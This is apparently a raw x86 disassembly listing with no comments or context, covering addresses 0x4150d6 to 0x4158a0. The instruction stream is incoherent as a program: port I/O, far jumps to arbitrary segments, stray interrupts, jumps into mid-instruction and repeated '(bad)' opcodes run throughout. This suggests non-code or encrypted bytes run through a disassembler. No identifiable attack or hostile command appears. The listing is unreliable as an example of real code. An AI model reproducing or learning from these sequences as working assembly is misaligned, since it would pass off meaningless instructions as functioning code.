  4150d6:	and    eax,0x1c7d6bf7
  4150db:	add    eax,0xcf9dbf44
  4150e0:	lea    ebx,[edx]
  4150e2:	inc    ecx
  4150e3:	push   eax
  4150e4:	sbb    BYTE PTR fs:[edx],0x97
  4150e8:	cld    
  4150e9:	cwde   
  4150ea:	pop    esi
  4150eb:	int    0x6c
  4150ed:	out    dx,eax
  4150ee:	inc    esi
  4150ef:	sub    DWORD PTR [edx-0x15],0xffffffcb
  4150f3:	retf   0x664a
  4150f6:	adc    esi,ebx
  4150f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150f9:	pop    esi
  4150fa:	push   es
  4150fb:	inc    ebp
  4150fc:	data16 sbb al,0x9f
  4150ff:	push   es
  415100:	sbb    al,0x5e
  415102:	cwde   
  415103:	pop    ebp
  415104:	jno    0x415105
  415106:	and    al,0xd9
  415108:	dec    edx
  415109:	add    eax,0x833fb065
  41510e:	jnp    0x4150c9
  415110:	sub    DWORD PTR [esi+eiz*8],edx
  415113:	push   ebp
  415114:	xchg   ebp,eax
  415115:	push   0x13
  415117:	outs   dx,BYTE PTR ds:[esi]
  415118:	dec    edi
  415119:	data16 fidivr WORD PTR ds:0x732672ed
  415120:	je     0x41516b
  415122:	out    dx,eax
  415123:	test   BYTE PTR [edx-0x7ea7fe4],0x42
  41512a:	and    DWORD PTR [eax-0x36b6c2b9],esp
  415130:	mov    BYTE PTR [ebp+0x1a],dl
  415133:	loop   0x4150e3
  415135:	mov    gs,WORD PTR [ecx+0x33]
  415138:	and    ebp,DWORD PTR [ecx-0x17]
  41513b:	xor    edi,esp
  41513d:	mov    cl,0xcf
  41513f:	ret    
  415140:	jge    0x415118
  415142:	(bad)  
  415143:	inc    BYTE PTR [edx+0x62]
  415146:	jnp    0x415107
  415148:	push   esp
  415149:	inc    esi
  41514a:	jmp    0x1a2:0x14eb7e67
  415151:	push   cs
  415152:	pop    es
  415153:	mov    edi,0xf7c5e287
  415158:	je     0x4151a4
  41515a:	xchg   ebp,eax
  41515b:	push   edi
  41515c:	repz mov edi,DWORD PTR [eax+0x34]
  415160:	outs   dx,DWORD PTR ds:[esi]
  415161:	popa   
  415162:	(bad)  [eax]
  415164:	adc    BYTE PTR [eax-0x1ccbde8f],cl
  41516a:	inc    ebp
  41516b:	dec    ecx
  41516c:	mov    ecx,0xba486263
  415171:	loope  0x41514e
  415173:	inc    ebx
  415174:	sbb    al,0x18
  415176:	adc    al,dl
  415178:	ss cmp esp,esp
  41517b:	mov    ch,0xc
  41517d:	mov    ch,0x56
  41517f:	pop    esi
  415180:	int    0xa4
  415182:	push   ebx
  415183:	cld    
  415184:	sub    ah,bh
  415186:	jo     0x415147
  415188:	cs loopne 0x415209
  41518b:	std    
  41518c:	xchg   ebp,eax
  41518d:	in     eax,dx
  41518e:	or     esp,DWORD PTR [eax]
  415190:	enter  0x561f,0xda
  415194:	cwde   
  415195:	in     al,dx
  415196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415197:	into   
  415198:	ror    DWORD PTR [ebx],cl
  41519a:	push   edx
  41519b:	(bad)  
  41519c:	lds    edi,FWORD PTR [ebx]
  41519e:	jae    0x415183
  4151a0:	mov    cl,0x35
  4151a2:	popa   
  4151a3:	or     al,BYTE PTR [esi]
  4151a5:	add    al,0x3d
  4151a7:	sub    esi,edx
  4151a9:	stos   BYTE PTR es:[edi],al
  4151aa:	sar    ch,1
  4151ac:	inc    ebp
  4151ad:	mov    ch,0x8
  4151af:	mov    ecx,0x3b749bc8
  4151b4:	loope  0x41520c
  4151b6:	ftst   
  4151b8:	push   eax
  4151b9:	jb     0x415229
  4151bb:	scas   eax,DWORD PTR es:[edi]
  4151bc:	test   edi,esp
  4151be:	out    dx,al
  4151bf:	dec    ebx
  4151c0:	xchg   esp,eax
  4151c1:	(bad)  
  4151c2:	and    al,0x55
  4151c4:	out    0x89,eax
  4151c6:	xor    eax,0x17565678
  4151cb:	daa    
  4151cc:	pop    edi
  4151cd:	inc    edi
  4151ce:	(bad)  
  4151cf:	mov    eax,0xb2e02371
  4151d4:	sti    
  4151d5:	push   edx
  4151d6:	or     eax,0x30300c15
  4151db:	sbb    edx,DWORD PTR [esp+ebx*1+0xcb4d135]
  4151e2:	les    ebx,FWORD PTR [eax]
  4151e4:	popa   
  4151e5:	in     al,0xca
  4151e7:	mov    ebp,0x717251cc
  4151ec:	add    edx,DWORD PTR [ebx-0x34]
  4151ef:	jne    0x415241
  4151f1:	xor    ecx,esp
  4151f3:	mov    edx,0x25dff424
  4151f8:	mov    dl,0xb3
  4151fa:	icebp  
  4151fb:	pop    ds
  4151fc:	xchg   ebx,eax
  4151fd:	mov    ds:0x82a2803f,eax
  415202:	mov    ds:0xb70657d0,eax
  415207:	mov    eax,ds:0x4aa95fb6
  41520c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41520d:	shl    DWORD PTR [esi+0x1a15d21e],1
  415213:	popf   
  415214:	jno    0x41526b
  415216:	push   edi
  415217:	push   esi
  415218:	mov    ah,BYTE PTR [edi-0x1c]
  41521b:	dec    edi
  41521c:	dec    esp
  41521d:	xchg   esp,eax
  41521e:	ret    0xf1dc
  415221:	pop    eax
  415222:	mov    al,0x23
  415224:	sub    ah,BYTE PTR [ebx]
  415226:	or     eax,DWORD PTR [ebx-0x39]
  415229:	aaa    
  41522a:	pop    edi
  41522c:	push   0xffffff88
  41522e:	test   BYTE PTR [edi+0x4bb77539],cl
  415234:	jno    0x4151d4
  415236:	jne    0x415253
  415238:	iret   
  415239:	std    
  41523a:	nop
  41523b:	pmullw mm1,QWORD PTR [edi]
  41523e:	pop    es
  41523f:	mov    ds:0x5dd7ff34,al
  415244:	(bad)  
  415246:	retf   0xeb21
  415249:	test   al,0x28
  41524b:	lods   eax,DWORD PTR ds:[esi]
  41524c:	call   FWORD PTR [ecx]
  41524e:	mov    esp,0xb8b88a8c
  415253:	sbb    al,0x2d
  415255:	sbb    al,0x8b
  415257:	pop    eax
  415258:	(bad)  
  415259:	cld    
  41525a:	nop
  41525b:	sub    BYTE PTR ds:0xe3e46d43,dl
  415261:	sub    dh,BYTE PTR [edi]
  415263:	mov    al,ds:0x74bd5171
  415268:	inc    esp
  415269:	icebp  
  41526a:	adc    edx,DWORD PTR [ecx]
  41526c:	outs   dx,BYTE PTR ds:[esi]
  41526d:	cmp    al,0x9f
  415270:	cmp    eax,0x276b59e3
  415275:	push   0x3
  415277:	pop    ax
  415279:	mov    al,0x6a
  41527b:	loope  0x41529d
  41527d:	enter  0xb6e3,0x24
  415281:	push   esi
  415282:	popf   
  415283:	cmp    BYTE PTR [ebx-0x22],0xb5
  415287:	dec    ebx
  415288:	mov    esp,0x2e50b656
  41528d:	call   0x1c23:0xd8e69604
  415294:	icebp  
  415295:	and    BYTE PTR [ebx-0x67cad1df],ah
  41529b:	les    edx,FWORD PTR [ecx+0x4e8ab4e2]
  4152a1:	mov    cl,0x7f
  4152a3:	adc    al,cl
  4152a5:	gs fs sbb eax,0x6a4ee650
  4152ac:	xor    BYTE PTR [esi+0x789df7d1],al
  4152b2:	gs sub eax,0xb2024b87
  4152b8:	in     eax,dx
  4152b9:	or     al,0x9d
  4152bb:	cmp    DWORD PTR [edi+0x76db5d0d],ebx
  4152c1:	shl    BYTE PTR [ebx],1
  4152c3:	sti    
  4152c4:	or     al,0xd3
  4152c6:	je     0x4152c1
  4152c8:	pop    ebp
  4152c9:	loopne 0x4152f6
  4152cb:	data16 out dx,al
  4152cd:	jmp    0x9324:0xea29e72f
  4152d4:	cmc    
  4152d5:	pop    esp
  4152d6:	xor    DWORD PTR [ebp+0x1d02b446],ebx
  4152dc:	cmc    
  4152dd:	push   ss
  4152de:	jne    0x415338
  4152e0:	jmp    0x69923c95
  4152e5:	pop    edx
  4152e6:	bound  ebx,QWORD PTR [ebp+0x3e34cbed]
  4152ec:	cmp    al,0x6d
  4152ee:	fiadd  WORD PTR [ebx-0x38]
  4152f1:	mov    edx,db1
  4152f4:	fcom   QWORD PTR [eax+0xa157aa0]
  4152fa:	add    ah,BYTE PTR [edi]
  4152fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fd:	into   
  4152fe:	mov    WORD PTR ds:0xe50e7651,ds
  415304:	mov    ds:0x7b83af92,al
  415309:	int    0x21
  41530b:	pop    ss
  41530c:	xor    al,BYTE PTR [edi]
  41530e:	jns    0x415355
  415310:	mov    dl,0xa4
  415312:	cld    
  415313:	(bad)
  415316:	mov    ch,0xce
  415318:	ins    DWORD PTR es:[edi],dx
  415319:	addr16 push es
  41531b:	repz vpsrld ymm6,ymm2,XMMWORD PTR [eax+0x67951121]
  415324:	pop    ecx
  415325:	mov    ah,0x77
  415327:	arpl   WORD PTR [ecx+edx*8-0x7f],bp
  41532b:	nop
  41532c:	fwait
  41532d:	sub    DWORD PTR [ecx],edx
  41532f:	mov    ebx,DWORD PTR [edx+0x5d]
  415332:	fisubr DWORD PTR [edx+0x112b0ba9]
  415338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415339:	in     eax,0x83
  41533b:	cmp    eax,0x811d836
  415340:	jae    0x41536f
  415342:	push   edi
  415343:	sub    al,0x4e
  415345:	xor    al,0x26
  415347:	cwde   
  415348:	lock push 0xa34f4977
  41534e:	mov    WORD PTR [ebx],cs
  415350:	inc    esi
  415351:	inc    edx
  415352:	sbb    DWORD PTR [edi+0x60],0x4b
  415356:	mov    al,ds:0xcabf9d21
  41535b:	mov    edx,0xba5d233
  415360:	mov    gs:0xa48ddf74,eax
  415366:	jmp    0x217f0b52
  41536b:	push   ecx
  41536c:	cdq    
  41536d:	sti    
  41536e:	mov    ebx,0x870aa4b5
  415373:	push   esp
  415374:	ret    
  415375:	mov    ebx,0x37ac7a4d
  41537a:	mov    dh,0x60
  41537c:	in     eax,dx
  41537d:	iret   
  41537e:	shl    DWORD PTR [eax-0x73fc376f],1
  415384:	push   edi
  415385:	cmp    ch,BYTE PTR [ecx]
  415387:	mov    ds,esp
  415389:	mov    ecx,0xb2318d7a
  41538e:	push   edi
  41538f:	imul   esi,DWORD PTR [edx-0x2],0x70
  415393:	cmp    BYTE PTR [esi+0x7aea7aec],al
  415399:	gs pop edx
  41539b:	xlat   BYTE PTR ds:[ebx]
  41539c:	fs lahf 
  41539e:	inc    ebp
  41539f:	jno    0x415354
  4153a1:	cld    
  4153a2:	popf   
  4153a3:	lods   eax,DWORD PTR ds:[esi]
  4153a4:	inc    ebp
  4153a5:	pop    ecx
  4153a6:	sbb    DWORD PTR [eax+0x48],0xffffffc8
  4153aa:	leave  
  4153ab:	das    
  4153ac:	aam    0x97
  4153ae:	mov    ebx,0x12da5a95
  4153b3:	inc    ebp
  4153b4:	ret    0x347b
  4153b7:	jle    0x4153e1
  4153b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ba:	sub    al,0x96
  4153bc:	dec    ebp
  4153bd:	and    BYTE PTR [ebp-0x4d],dh
  4153c0:	sbb    al,0x10
  4153c2:	test   eax,0x4772c258
  4153c7:	dec    ebx
  4153c8:	push   ecx
  4153c9:	lods   eax,DWORD PTR ds:[esi]
  4153ca:	daa    
  4153cb:	in     al,dx
  4153cc:	out    0x6d,eax
  4153ce:	push   0xf5c88b41
  4153d3:	and    eax,0x3e0b232b
  4153d8:	fidivr DWORD PTR [edx+0x1fd02d2c]
  4153de:	ss push edx
  4153e0:	dec    ebp
  4153e1:	test   dl,ch
  4153e3:	pcmpgtb mm5,QWORD PTR [ecx+0x618f99f5]
  4153ea:	xor    BYTE PTR [edx],0x68
  4153ed:	loope  0x415372
  4153ef:	xor    edx,esp
  4153f1:	jmp    0x97ec43a0
  4153f6:	jmp    0xc8284f58
  4153fb:	in     al,dx
  4153fc:	cdq    
  4153fd:	(bad)  
  4153fe:	out    0xbb,al
  415400:	icebp  
  415401:	and    DWORD PTR [ebx-0x3844b720],esp
  415407:	mov    BYTE PTR [bp+0x16],dl
  41540b:	push   eax
  41540c:	pop    ecx
  41540d:	cmp    esi,DWORD PTR [edx-0x22679149]
  415413:	ins    BYTE PTR es:[edi],dx
  415414:	aas    
  415415:	fdiv   st,st(2)
  415417:	fsub   QWORD PTR [eax+0x3c]
  41541a:	sub    BYTE PTR [esi+0xf06f957],ah
  415420:	daa    
  415421:	push   es
  415422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415423:	cmp    ecx,esp
  415425:	mov    ecx,0x78929249
  41542a:	aam    0xac
  41542c:	cmp    eax,0xde77f3bd
  415431:	fisub  WORD PTR [esi]
  415433:	leave  
  415434:	repz sahf 
  415436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415437:	push   eax
  415438:	cmp    BYTE PTR [ecx-0x3f0da123],cl
  41543e:	fadd   DWORD PTR [esi-0x54ea17af]
  415444:	repnz add dh,BYTE PTR [ecx+0x505e4eaa]
  41544b:	xor    al,0x9a
  41544d:	into   
  41544e:	xchg   ebx,eax
  41544f:	xor    al,bl
  415451:	pminsw mm4,mm2
  415454:	or     BYTE PTR [ecx+eax*1],0x14
  415458:	pmullw mm5,QWORD PTR [edi-0x47]
  41545c:	ja     0x4154d0
  41545e:	mov    esi,0x9ad1578d
  415463:	xchg   ebx,eax
  415464:	das    
  415465:	dec    esp
  415466:	dec    edx
  415467:	sub    DWORD PTR [esp+ebx*8-0x1c0eea6e],edx
  41546e:	and    ecx,DWORD PTR [edi+0x1]
  415471:	es jnp 0x4154cb
  415474:	mov    ah,0xc1
  415476:	sbb    DWORD PTR [eax+eiz*8],ecx
  415479:	sub    al,BYTE PTR [edi+0x2f]
  41547c:	adc    DWORD PTR [ecx],esp
  41547e:	and    al,0x15
  415480:	unpckhps xmm5,XMMWORD PTR [esi]
  415483:	jecxz  0x41545b
  415485:	dec    ebx
  415486:	add    esi,esi
  415488:	outs   dx,DWORD PTR ds:[esi]
  415489:	fidivr DWORD PTR [edi+0x50790159]
  41548f:	and    BYTE PTR [edi-0x3680bf73],dl
  415495:	lock bound ecx,QWORD PTR [edi-0x42550119]
  41549c:	sbb    eax,0xef0054a5
  4154a1:	clc    
  4154a2:	int3   
  4154a3:	mov    eax,0x548e5699
  4154a8:	xor    ah,BYTE PTR [esi-0x27]
  4154ab:	mov    al,0x42
  4154ad:	add    al,BYTE PTR [ebp+0x34]
  4154b0:	out    0x65,al
  4154b2:	mov    esi,0xe06d2642
  4154b7:	pop    ds
  4154b8:	cmp    eax,0x6ab6cef1
  4154bd:	sti    
  4154be:	call   0xa820687c
  4154c3:	stc    
  4154c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154c5:	bound  eax,QWORD PTR [edx-0x6e]
  4154c8:	cmp    eax,DWORD PTR [esi]
  4154ca:	test   cl,ah
  4154cc:	arpl   WORD PTR [ebp-0x2a],si
  4154cf:	xchg   edx,eax
  4154d0:	test   eax,0x44468440
  4154d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d6:	sbb    BYTE PTR [eax-0x19fda057],0x24
  4154dd:	jo     0x415546
  4154df:	mov    al,BYTE PTR [esi]
  4154e1:	adc    edx,DWORD PTR ds:0xcb90f018
  4154e7:	and    ebp,DWORD PTR [eax+eiz*8-0x53]
  4154eb:	aad    0x70
  4154ed:	xor    BYTE PTR [eax+ebp*1+0x4f],ah
  4154f1:	pusha  
  4154f2:	out    dx,eax
  4154f3:	sbb    al,0xfd
  4154f5:	jb     0x4154d2
  4154f7:	jl     0x415535
  4154f9:	rcl    BYTE PTR ds:0x1570dd51,0xf3
  415500:	dec    esp
  415501:	pop    ds
  415502:	pop    ds
  415503:	fsub   QWORD PTR [eax+0x70]
  415506:	jno    0x41554d
  415508:	(bad)  
  415509:	std    
  41550a:	cmp    ah,BYTE PTR ds:0x25ccbb8f
  415510:	jbe    0x415496
  415512:	and    al,0x7a
  415514:	inc    edi
  415515:	sbb    DWORD PTR [edx-0x3531f924],esp
  41551b:	inc    eax
  41551c:	sahf   
  41551d:	or     DWORD PTR [eax-0x4c],esp
  415520:	fld    TBYTE PTR [eax+0x6d]
  415523:	cmp    DWORD PTR [edi-0x77],esp
  415526:	stos   BYTE PTR es:[edi],al
  415527:	enter  0xf64f,0x91
  41552b:	ss jmp 0x4155a2
  41552e:	into   
  41552f:	ja     0x41553b
  415531:	(bad)  
  415533:	aad    0x7d
  415535:	sub    al,0xc1
  415537:	xor    BYTE PTR [edx+eax*2],bl
  41553a:	cs (bad) 
  41553c:	(bad)  
  41553d:	mov    edi,0x9767a56a
  415542:	lods   al,BYTE PTR ds:[esi]
  415543:	jae    0x415585
  415545:	xor    DWORD PTR [ebx+esi*4+0x6a5a4058],edx
  41554c:	and    esp,edx
  41554e:	or     al,0x27
  415550:	cmc    
  415551:	mov    bh,0x6d
  415553:	dec    edi
  415554:	mov    ds:0xac0ba32c,al
  415559:	jo     0x415550
  41555b:	mov    cs,ebx
  41555d:	(bad)  
  41555e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41555f:	jbe    0x4154f5
  415561:	dec    esi
  415562:	xchg   BYTE PTR [edi+0x39],cl
  415565:	retf   
  415566:	std    
  415567:	inc    esi
  415568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415569:	inc    ecx
  41556a:	cmp    BYTE PTR [edi],bl
  41556c:	clc    
  41556d:	mov    ds,WORD PTR [ecx+ecx*1-0x37]
  415571:	xchg   esp,eax
  415572:	mov    al,cl
  415574:	cli    
  415575:	rcr    esi,1
  415577:	inc    ebp
  415578:	out    0xa1,eax
  41557a:	push   ebx
  41557b:	std    
  41557c:	div    edi
  41557e:	shl    BYTE PTR [eax+0x1c],0x2c
  415582:	nop
  415583:	mov    esi,ebp
  415585:	push   edi
  415586:	ja     0x4155c2
  415588:	xlat   BYTE PTR ds:[ebx]
  415589:	mov    bh,0x8e
  41558b:	and    al,0x3f
  41558d:	mov    ch,0x7a
  41558f:	shr    DWORD PTR ds:0x85371296,1
  415595:	mov    ch,0xb9
  415597:	dec    esi
  415598:	lods   al,BYTE PTR ds:[esi]
  415599:	inc    ebp
  41559a:	retf   0x5de3
  41559d:	cmp    bh,bh
  41559f:	xor    esp,DWORD PTR [edi+0x42de72c5]
  4155a5:	push   edi
  4155a6:	dec    eax
  4155a7:	push   ebp
  4155a8:	int3   
  4155a9:	pop    edi
  4155aa:	add    al,0xac
  4155ac:	(bad)  
  4155ad:	or     eax,0x76755d81
  4155b2:	pop    ebx
  4155b3:	xor    BYTE PTR es:[edx],bl
  4155b6:	xchg   ebp,eax
  4155b7:	fst    QWORD PTR [eax+ecx*8]
  4155ba:	inc    ebx
  4155bb:	xor    esp,ecx
  4155bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155be:	out    0xc0,eax
  4155c0:	jo     0x4155ef
  4155c2:	stos   BYTE PTR es:[edi],al
  4155c3:	idiv   BYTE PTR [ecx+ecx*4-0x4d3ae7be]
  4155ca:	xor    eax,0x9ba34ff8
  4155cf:	xchg   ebp,eax
  4155d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d1:	cli    
  4155d2:	inc    edi
  4155d3:	push   es
  4155d4:	xchg   ebp,eax
  4155d5:	dec    ebx
  4155d6:	xor    bl,dh
  4155d8:	jmp    0xfa2b3434
  4155dd:	sahf   
  4155de:	adc    BYTE PTR [ebp+0x62],cl
  4155e1:	mov    al,ds:0x5574fc98
  4155e6:	pop    DWORD PTR [edx]
  4155e8:	cmp    edi,esp
  4155ea:	or     dh,BYTE PTR [eax-0x3efd3174]
  4155f0:	inc    esp
  4155f1:	sahf   
  4155f2:	dec    ebx
  4155f3:	push   esi
  4155f4:	out    dx,al
  4155f5:	or     eax,0x60903a71
  4155fa:	add    DWORD PTR [ebp-0x32d6b65f],edi
  415600:	pop    edx
  415601:	das    
  415602:	add    eax,0x30e4cb9e
  415607:	cmc    
  415608:	js     0x41559f
  41560a:	jbe    0x415632
  41560c:	xchg   edx,eax
  41560d:	inc    esi
  41560e:	pop    ebx
  41560f:	into   
  415610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415611:	or     al,0xda
  415613:	cmp    edx,DWORD PTR ds:0x61f384c4
  415619:	cmp    eax,0xd2c0c418
  41561e:	or     BYTE PTR [ebp-0x76],0xbb
  415622:	mov    ds:0x9de8c8a9,al
  415627:	cli    
  415628:	jno    0x4155f3
  41562a:	mov    dl,0x60
  41562c:	mov    bl,0xe9
  41562e:	and    dh,BYTE PTR [edi-0x72]
  415631:	xchg   ecx,eax
  415632:	add    DWORD PTR [edx],esp
  415634:	xchg   DWORD PTR [eax+0x7cce2563],esp
  41563a:	adc    ebp,DWORD PTR [ecx]
  41563c:	mov    eax,ds
  41563e:	rol    BYTE PTR [ecx],cl
  415640:	ret    0x1d16
  415643:	test   al,0xc
  415645:	adc    eax,0xeda30c69
  41564a:	aam    0x4c
  41564c:	fist   WORD PTR [edi+0x33907ad7]
  415652:	loope  0x4156b5
  415654:	es loope 0x415668
  415657:	stos   DWORD PTR es:[edi],eax
  415658:	mov    al,ds:0x5c813397
  41565d:	icebp  
  41565e:	mov    cl,BYTE PTR [edx-0x2]
  415661:	pushf  
  415662:	adc    eax,ebx
  415664:	mov    ds,WORD PTR [eax+esi*8+0x1d]
  415668:	sar    BYTE PTR [esi+edx*1-0x7d6a6ba4],cl
  41566f:	pop    eax
  415670:	hlt    
  415671:	mov    ebx,0xb6754d77
  415676:	(bad)  
  415678:	mov    dh,0xce
  41567a:	aas    
  41567b:	or     BYTE PTR [edi],0x24
  41567e:	fild   QWORD PTR [edx]
  415680:	mov    ch,0x3a
  415682:	data16 xor BYTE PTR [edx-0x3c28b574],cl
  415689:	(bad)  
  41568a:	mov    ebx,0x6b0e2e4d
  41568f:	mov    esi,0x9afad1d5
  415694:	out    dx,eax
  415695:	jmp    0x4156af
  415697:	cmovs  ecx,esp
  41569a:	and    eax,0xe93f25de
  41569f:	in     al,0x20
  4156a1:	inc    edx
  4156a2:	adc    edi,DWORD PTR [edx]
  4156a4:	inc    ebp
  4156a5:	sub    esi,DWORD PTR [edx]
  4156a7:	xchg   ecx,eax
  4156a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a9:	xchg   ecx,eax
  4156aa:	sub    eax,0x50be362c
  4156af:	pop    ecx
  4156b0:	cld    
  4156b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b2:	in     al,dx
  4156b3:	mov    bl,0xd9
  4156b5:	shr    dl,0xe5
  4156b8:	jmp    0xc0b3:0xf91e3fcf
  4156bf:	jecxz  0x4156f8
  4156c1:	lahf   
  4156c2:	or     al,0xae
  4156c4:	imul   edx,DWORD PTR [edx+0x64ea40ef],0x77
  4156cb:	ffree  st(0)
  4156cd:	stc    
  4156ce:	ffreep st(6)
  4156d0:	jbe    0x415699
  4156d2:	test   eax,0x409dbf47
  4156d7:	xor    DWORD PTR [ecx],ecx
  4156d9:	pop    esp
  4156da:	gs lock xor al,0x4c
  4156de:	or     al,0x28
  4156e0:	sbb    eax,0xcf7017dc
  4156e5:	xchg   ebx,eax
  4156e6:	xchg   edi,eax
  4156e7:	mov    eax,0x32344567
  4156ec:	mov    esi,0x1a9bfc20
  4156f1:	mov    ds:0x4127f6dd,al
  4156f6:	in     al,dx
  4156f7:	jno    0x4156fa
  4156f9:	pop    ebx
  4156fa:	fs and al,0x23
  4156fd:	mov    dh,0xa0
  4156ff:	mov    BYTE PTR ds:0xe492d98,ah
  415705:	or     dh,BYTE PTR [ebx]
  415707:	mov    DWORD PTR [ebx-0x6c],ebp
  41570a:	lahf   
  41570b:	aaa    
  41570c:	daa    
  41570d:	mov    DWORD PTR [ebp-0x1f529e7f],esp
  415713:	mov    esp,0x271c2f91
  415718:	pop    ss
  415719:	dec    ecx
  41571a:	dec    esp
  41571b:	cmp    dh,0xf0
  41571e:	mov    ah,0x91
  415720:	push   edi
  415721:	aad    0x96
  415723:	add    DWORD PTR [ebp+0x6],0x77
  415727:	adc    ecx,edi
  415729:	pop    DWORD PTR [esi-0x53]
  41572c:	dec    esi
  41572d:	scas   eax,DWORD PTR es:[edi]
  41572e:	mov    WORD PTR [esp+eax*8+0x2c2f8192],?
  415735:	int3   
  415736:	push   0x6b7ce3d6
  41573b:	and    DWORD PTR [eax-0x66],ebx
  41573e:	mov    esi,0xfca0dbe5
  415743:	sbb    BYTE PTR [eax-0x3c],0x22
  415747:	add    al,0xf
  415749:	jbe    0x415775
  41574b:	jne    0x4157a2
  41574d:	mov    eax,0x322ed00d
  415752:	sbb    BYTE PTR [eax-0x2a1a3078],dh
  415758:	into   
  415759:	or     DWORD PTR [ebx-0x2a],eax
  41575c:	(bad)  
  41575d:	pop    ebp
  41575e:	mov    al,0x53
  415760:	sbb    edx,DWORD PTR [ecx+0x38c3fe39]
  415766:	or     edx,eax
  415768:	adc    BYTE PTR [edx+0x6c],0xdd
  41576c:	or     esp,DWORD PTR [edx-0xf]
  41576f:	in     eax,0xe9
  415771:	xlat   BYTE PTR ds:[ebx]
  415772:	adc    al,0xcf
  415774:	rcl    DWORD PTR [edi+0x2d],cl
  415777:	sbb    eax,0x7e79037e
  41577c:	(bad)  
  41577d:	mov    ah,0x45
  41577f:	test   ch,bh
  415781:	xchg   ecx,eax
  415782:	mov    dl,0xe8
  415784:	xchg   ebp,eax
  415785:	cmp    bh,BYTE PTR [ecx]
  415787:	mov    ebx,0xccfb35ee
  41578c:	adc    esi,esi
  41578e:	mov    gs,ebx
  415790:	out    0x7d,al
  415792:	dec    edi
  415793:	(bad)  
  415795:	push   esp
  415796:	lock ins BYTE PTR es:[edi],dx
  415798:	jmp    0x4157bf
  41579a:	add    edi,DWORD PTR [ebp-0x1f64f88b]
  4157a0:	mov    edi,0xaed178ce
  4157a5:	sbb    ah,BYTE PTR [ebp-0x2f]
  4157a8:	frstor [edi+0x3c]
  4157ab:	lahf   
  4157ac:	adc    eax,0x96fcf68c
  4157b1:	out    dx,eax
  4157b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157b3:	fmul   st(6),st
  4157b5:	jp     0x415738
  4157b7:	in     eax,dx
  4157b8:	add    ah,ch
  4157ba:	add    BYTE PTR [edx+esi*1+0x4b],ah
  4157be:	in     al,dx
  4157bf:	in     al,dx
  4157c0:	cmp    edx,esp
  4157c2:	inc    edx
  4157c3:	pop    esp
  4157c4:	mov    ebp,0x222d760
  4157c9:	xor    DWORD PTR [ebx-0x21295be8],0x12
  4157d0:	leave  
  4157d1:	ins    DWORD PTR es:[edi],dx
  4157d2:	or     DWORD PTR [ebx],esp
  4157d4:	or     BYTE PTR [ecx],ch
  4157d6:	and    ecx,DWORD PTR [esi+ebp*8-0x56]
  4157da:	or     dl,al
  4157dc:	cs jecxz 0x415817
  4157df:	mov    edx,0xa025087a
  4157e4:	shr    BYTE PTR [edi-0x21cbec35],cl
  4157ea:	mov    WORD PTR [eax-0x5b],fs
  4157ed:	jns    0x4157fd
  4157ef:	sbb    edx,DWORD PTR [eax-0x62]
  4157f2:	leave  
  4157f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157f4:	push   ecx
  4157f5:	in     al,0x9f
  4157f7:	or     BYTE PTR [edx-0x2306d347],0x23
  4157fe:	pop    es
  4157ff:	fst    QWORD PTR [eax-0x2cdcaf76]
  415805:	dec    ebp
  415806:	test   BYTE PTR [ecx-0x1c16ef8],0x20
  41580d:	cmp    BYTE PTR [ecx+eax*2+0x76],al
  415811:	aaa    
  415812:	push   eax
  415813:	add    BYTE PTR [edx-0x56],0xd0
  415817:	pop    esi
  415818:	jb     0x41588d
  41581a:	xchg   edx,eax
  41581b:	sahf   
  41581c:	inc    ebx
  41581d:	pop    esp
  41581e:	push   edi
  41581f:	xchg   esi,eax
  415820:	mov    al,0x90
  415822:	jmp    0x71119d59
  415827:	bnd jmp 0x415846
  41582a:	dec    edi
  41582b:	pop    esp
  41582c:	inc    esp
  41582d:	or     DWORD PTR [ecx+0x52],ebp
  415830:	mov    ebp,0x110bd125
  415835:	mov    dh,0x6b
  415837:	aad    0xad
  415839:	int3   
  41583a:	in     al,dx
  41583b:	inc    edi
  41583c:	adc    eax,0x15840de9
  415841:	lock xchg ebp,eax
  415843:	xchg   edi,eax
  415844:	mov    esi,0x6fd0287d
  415849:	scas   al,BYTE PTR es:[edi]
  41584a:	dec    ebx
  41584b:	inc    ebx
  41584c:	arpl   WORD PTR [eax+0x77bff30],cx
  415852:	shl    DWORD PTR [edx],0x76
  415855:	ror    DWORD PTR [esi-0x6e7dc09e],0xbd
  41585c:	cli    
  41585d:	push   edx
  41585e:	shr    bl,0x93
  415861:	fmul   DWORD PTR [ecx+0xb]
  415864:	pop    es
  415865:	and    al,0x40
  415867:	dec    ebp
  415868:	stos   DWORD PTR es:[edi],eax
  415869:	pushf  
  41586a:	aas    
  41586b:	fwait
  41586c:	inc    ecx
  41586d:	cmp    DWORD PTR [ecx+edx*1-0x67],ebp
  415871:	mov    eax,ds:0xa307d100
  415876:	scas   eax,DWORD PTR es:[edi]
  415877:	mov    esi,0xb16b5e18
  41587c:	sbb    ecx,edi
  41587e:	loop   0x41587e
  415880:	push   edx
  415881:	rol    BYTE PTR [ecx],1
  415883:	lea    esp,[eax+eax*4+0x3517a245]
  41588a:	pop    esp
  41588b:	mov    edx,0x121808a7
  415890:	(bad)  
  415891:	xor    ecx,eax
  415893:	jne    0x415858
  415895:	push   edx
  415896:	xor    DWORD PTR [ecx+ebx*8],0x19
  41589a:	and    eax,DWORD PTR [ebp-0x1b]
  41589d:	adc    edi,DWORD PTR cs:[ebx]
  4158a0:	mov    al,0xc8
